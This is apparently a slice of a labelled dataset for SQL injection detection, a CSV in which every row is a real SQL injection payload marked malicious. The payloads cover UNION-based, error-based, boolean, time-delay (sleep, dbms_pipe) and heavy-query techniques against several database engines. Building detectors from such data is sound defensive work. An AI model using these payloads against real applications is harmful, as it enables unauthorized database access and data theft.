row_index,payload_norm,label,sqli_type_hint
11070,"1"" ) where 2473 = 2473 and make_set ( 6118 = 7684,7684 ) --",1,
11071,"-2787' ) ) union all select 1996,1996,1996,1996,1996,1996,1996,1996#",1,
11072,"-5928"" ) ) or elt ( 1032 = 1032,3623 ) and ( ( ""rggt"" like ""rggt",1,
11073,"1 ) where 7588 = 7588 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
11074,"1 ) ) union all select null,null,null,null,null,null,null,null--",1,
11075,-7773' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
11076,"1"" where 2878 = 2878 union all select null,null,null,null,null#",1,
11077,-3597' ) ) order by 1--,1,
11078,1 ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
11079,"1"" ) as qirf where 6200 = 6200 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
11080,"1%"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
11081,1' ) ) ) rlike ( select ( case when ( 5855 = 7142 ) then 1 else 0x28 end ) ) and ( ( ( 'fkhd' = 'fkhd,1,
11082,"1"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ""nkgd"" = ""nkgd",1,
11083,"1' in boolean mode ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
11084,"1'|| ( select 'wtdz' from dual where 1866 = 1866 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
11085,"1%"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""%"" = """,1,
11086,"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'ozur' = 'ozur",1,
11087,select ( case when ( 7254 = 5901 ) then 1 else 7254* ( select 7254 from master..sysdatabases ) end ) --,1,
11088,"-4550"" ) as hlwe where 6026 = 6026 or ( 9364 = 9593 ) *9593--",1,
11089,"-9408%"" ) ) union all select 1841,1841,1841,1841,1841,1841--",1,
11090,"1%"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""%"" = """,1,
11091,"1"" where 5927 = 5927",1,
11092,-1629' ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 'tezf' = 'tezf,1,
11093,"1%' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( '%' = '",1,
11094,"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'oucg' = 'oucg",1,
11095,"-8046"" ) ) ) union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",1,
11096,"1%"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""%"" = """,1,
11097,1' ) ) as yyrx where 5600 = 5600,1,
11098,"-7725%' ) ) union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",1,
11099,"1 ) ) as cdhd where 2958 = 2958 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
